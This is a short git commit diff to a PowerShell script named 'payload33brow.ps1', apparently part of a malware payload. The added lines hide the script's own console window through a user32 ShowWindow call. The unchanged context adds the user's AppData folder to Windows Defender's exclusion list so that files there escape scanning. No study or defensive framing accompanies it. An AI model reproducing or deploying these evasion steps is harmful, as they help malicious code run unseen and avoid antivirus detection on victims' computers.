b54958b05f787fe8ffbf40bc9ed14d5e61f1c47f
karlosedson <141760028+karlosedson@users.noreply.github.com>
2023-11-04 13:52:43 -0300

    Update payload33brow.ps1

--- payload33brow.ps1
+++ payload33brow.ps1
@@ -1,4 +1,6 @@
-
+$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
+add-type -name win -member $t -namespace native
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
 #Adding windows defender exclusionpath
 Add-MpPreference -ExclusionPath "$env:appdata"
 #Creating the directory we will work on
